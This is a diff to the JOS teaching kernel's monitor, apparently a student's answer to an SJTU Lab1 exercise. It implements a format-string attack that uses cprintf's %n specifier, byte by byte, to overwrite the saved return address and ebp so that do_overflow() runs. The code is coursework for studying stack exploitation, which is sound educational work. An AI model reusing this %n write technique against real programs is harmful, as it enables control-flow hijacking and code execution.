@@ -61,6 +61,90 @@ mon_kerninfo(int argc, char **argv, struct Trapframe *tf)
 	return 0;
 }
 
+// SJTU
+// Lab1 only
+// read the pointer to the retaddr on the stack
+static uint32_t
+read_pretaddr() {
+    uint32_t pretaddr;
+    __asm __volatile("leal 4(%%ebp), %0" : "=r" (pretaddr));
+    return pretaddr;
+}
+
+static void
+do_overflow() {
+    cprintf("Overflow success\n");
+}
+
+void
+start_overflow() {
+	// You should use a techique similar to buffer overflow
+	// to invoke the do_overflow function and
+	// the procedure must return normally.
+
+    // And you must use the "cprintf" function with %n specifier
+    // you augmented in the "Exercise 9" to do this job.
+
+    // hint: You can use the read_pretaddr function to retrieve
+    //       the pointer to the function call return address;
+
+    char str[256] = {};
+    int nstr = 0;
+    char *pret_addr;
+
+	// Your code here.
+    // Why you can use cprintf(%n), cause %n ref to a pointer
+    // So, you can replace the return addr with the start addr of do_overflow()
+    memset(str, 0, 256);
+	pret_addr = (char*)read_pretaddr(); // the ret_addr within the overflow_stack
+    uint32_t ebp = read_ebp(); // should pass to do_overflow()
+    cprintf("ebp_addr: %x\n", ebp);
+
+    /* void (*do_addr)();
+    do_addr = do_overflow;  // the start addr of do_overflow() */
+    uint32_t do_addr = (uint32_t) do_overflow;
+    cprintf("do_: %x ret_: %x\n", do_addr, pret_addr);
+
+    for (int i=0; i<4; i++) {
+        nstr = ( (do_addr >> (8*i)) & 0xff);
+        str[nstr] = '\0';
+        cprintf("%s%n", str, (pret_addr + i));
+        cprintf("nstr: %x ret: %x\n",nstr,*(pret_addr+i));
+        str[nstr] = 0;
+    }
+
+    for (int i=0; i<4; i++) {
+        nstr = ( (ebp >> (8*i)) & 0xff);
+        str[nstr] = '\0';
+        cprintf("%s%n", str, (pret_addr +4+ i));
+        cprintf("nstr: %x ret: %x\n",nstr,*(pret_addr+4+i));
+        str[nstr] = 0;
+    }
+
+    /*  just replace the addr
+	uint32_t ret_byte_0 = ret_addr & 0xff;
+	uint32_t ret_byte_1 = (ret_addr >> 8) & 0xff;
+	uint32_t ret_byte_2 = (ret_addr >> 16) & 0xff;
+	uint32_t ret_byte_3 = (ret_addr >> 24) & 0xff;
+	str[ret_byte_0] = '\0';
+	cprintf("%s%n\n", str, pret_addr);
+	str[ret_byte_0] = 'h';
+	str[ret_byte_1] = '\0';
+	cprintf("%s%n\n", str, pret_addr+1);
+	str[ret_byte_1] = 'h';
+	str[ret_byte_2] = '\0';
+	cprintf("%s%n\n", str, pret_addr+2);
+	str[ret_byte_2] = 'h';
+	str[ret_byte_3] = '\0';
+	cprintf("%s%n\n", str, pret_addr+3);
+    */
+}
+
+void
+overflow_me() {
+    start_overflow();
+}
+
 int
 mon_backtrace(int argc, char **argv, struct Trapframe *tf)
 {
@@ -94,6 +178,10 @@ mon_backtrace(int argc, char **argv, struct Trapframe *tf)
 
         current_ebp = prev_ebp;
     }
+
+    // @FIXME bug: something like ICS-buf-lab fizz (execute func instead of calling func)
+    /* overflow_me(); // the design is not elegant */
+    cprintf("Backtrace success\n");
 	return 0;
 }
 
@@ -378,6 +466,11 @@ monitor(struct Trapframe *tf)
 	cprintf("Welcome to the JOS kernel monitor!\n");
 	cprintf("Type 'help' for a list of commands.\n");
 
+    /* char *str = "hellp"; */
+    /* char *p = str; */
+    /* cprintf("%s%n\n", str, p); */
+    /* cprintf("%d\n", *p); */
+
 	cprintf("%-5dfat\n", 3);
 	// sjtu lab1:ex-11
 
@@ -403,7 +496,7 @@ monitor(struct Trapframe *tf)
 	}
 }
 
-// COPY FROM SJTU
+// SJTU
 // return EIP of caller.
 // does not work if inlined.
 // putting at the end of the file seems to prevent inlining.
@@ -414,7 +507,3 @@ read_eip()
 	__asm __volatile("movl 4(%%ebp), %0" : "=r" (callerpc));
 	return callerpc;
 }
-
-
-
-
